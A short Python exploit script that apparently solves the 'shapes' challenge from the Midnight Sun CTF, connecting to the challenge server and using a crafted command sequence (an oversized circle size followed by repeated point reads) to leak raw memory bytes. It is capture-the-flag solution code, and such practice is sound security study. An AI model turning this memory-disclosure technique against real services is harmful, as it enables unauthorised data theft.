#!/usr/bin/env python
import socket
import sys
import time
import struct


def SendCommand(cmd):
    global sock

    asBytes = cmd.encode()
    sock.send(len(asBytes).to_bytes(1,"big")+asBytes)

    got = sock.recv(1000).decode()
    return got

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) > 1 and sys.argv[1] == 'local':
    server_address = ('localhost', 2222)
else:
    server_address = ('shapes-01.play.midnightsunctf.se', 1111)

sock.connect(server_address)

print(SendCommand("create,polygon"))  # 0

print(SendCommand("addpoint,0,65,65"))

print(SendCommand("create,circle"))  # 1

print(SendCommand("circlesize,A1,10000"))

values = []
for i in range(100):
    line = SendCommand("getpoint,0,{}".format(i))
    values += [int(x.strip()) for x in line[line.find("=")+2:].split(",")]


print(b''.join([struct.pack('i', x) for x in values]))


sock.close()
